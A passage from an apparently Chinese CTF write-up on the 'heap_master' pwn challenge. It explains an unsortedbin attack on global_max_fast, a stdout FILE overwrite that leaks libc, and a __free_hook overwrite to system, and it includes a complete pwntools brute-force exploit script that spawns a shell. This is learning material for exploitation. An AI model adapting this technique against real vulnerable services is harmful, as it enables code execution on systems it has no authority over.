0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_read_end\nidx = (_IO_read_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\nlibc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\nlog.info(\"libc_base:0x%x\"%libc_base)\n__free_hook = libc_base + libc.sym['__free_hook'] \nfastbinsY = libc_base + libc.sym['main_arena'] + 8 \nsystem_addr = libc_base + libc.sym['system']\n```\n\nmmap为0x4a0fe000\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-03-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-32.png)\n\n四个均修改过了，这种情况下flag不修改也是可以泄露的。\n\n▲其实这个只写write_base和read_end也可以，只不过会发送特别多的数据过来，打远程的时候很不好打。需要注意的是read_end得最后写。\n\n(4)越界释放chunk到_free_hook，然后修改其fd为system，再申请回来就可以将_free_hook改为system。\n\n```python\n#注释头\n\n# fake fastbin fd to system\nidx = (__free_hook - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nlog.info(\"size:0x%x\"%size)\nedit(0x10 + 8, p64(size+1))\nedit(0x10 + size, p64(0x0)+p64(0x21))\ndelete(0x10 + 0x10)\nedit(0x20, p64(system_addr))\nadd(size - 0x10)\n```\n\n没有申请回来之前，free_hook上是堆地址，其FD为system\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-3.png)\n\n申请回来之后，FD被写进free_hook，这是fastbin机制造成的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-3.png)\n\n(5)创建/bin/sh堆块，释放即可getshell：\n\n```python\n#注释头\n\nedit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\ndelete(0x200 + 0x10)\nio.interactive()\n```\n\n# 5.总的爆破EXP：\n\n```python\n#注释头\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom time import sleep\nimport os\ncontext.binary = \"./heap_master\"\nlibc = ELF(context.binary.libc.path)\n\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n\ndef pwn():\n    global io\n    edit(0,p64(0x0)+p64(0x91)+\n        '0'*0x80+\n        p64(0x0)+p64(0x21)+\n        '1'*0x10+\n        p64(0x0)+p64(0x21))\n    delete(0x10)\n    guess = 0x9000\n    edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10)&0xffff))\n    add(0x80)\n\n\n    fastbinsY = guess + libc.sym['main_arena'] + 8\n    _IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n    _IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n    _IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n    _IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n    __free_hook = guess + libc.sym['__free_hook']\n    _IO_list_all = guess + libc.sym['_IO_list_all']\n\n    # overwrite _IO_2_1_stdout_._IO_write_base\n    idx = (_IO_write_base - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_write_ptr\n    idx = (_IO_write_ptr - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n    # overwrite _IO_2_1_stdout_._IO_write_end\n    idx = (_IO_write_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_read_end\n    idx = (_IO_read_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n    libc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\n    log.info(\"libc_base:0x%x\"%libc_base)\n    __free_hook = libc_base + libc.sym['__free_hook']\n    fastbinsY = libc_base + libc.sym['main_arena'] + 8\n    system_addr = libc_base + libc.sym['system']\n\n\n    # fake fastbin fd to system\n    idx = (__free_hook - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    log.info(\"size:0x%x\"%size)\n    edit(0x10 + 8, p64(size+1))\n    edit(0x10 + size, p64(0x0)+p64(0x21))\n    delete(0x10 + 0x10)\n    edit(0x20, p64(system_addr))\n    #dbg()\n    add(size - 0x10)\n    #pause()\n\n    edit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\n    delete(0x200 + 0x10)\n\n    io.interactive()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io = process(\"./heap_master\")\n    try:\n        pwn()\n        io.recv(timeout = 1) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        # sleep(0.1)\n        # io.sendline('/bin/sh\\x00')\n        # sleep(0.1)\n        # io.interactive() #没有EOFError的话就是爆破成功，可以开shell\n        break\n```\n\n# 6.总结：\n\n(1)unsortedbin attack：修改bk任意写main_arena，这里bk通常可以进行部分写来爆破，也常常用来修改global_max_fast，使得fastbinY越界写。\n\n(2)FSOP的利用中，不一定非得修改flag，修改_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end也可以，其中需要满足_IO_read_end等于_IO_write_base来起到flag的作用绕过检查。\n\n(3)fastbinY数组的越界申请，修改其fd可实现任意写，这点和利用fastbinY数组中chunk大小在main_arena中留下0x20~0x80的数据异曲同工。","tags":["Heap-Skill"],"categories":["pwn堆-刷题技巧"]}]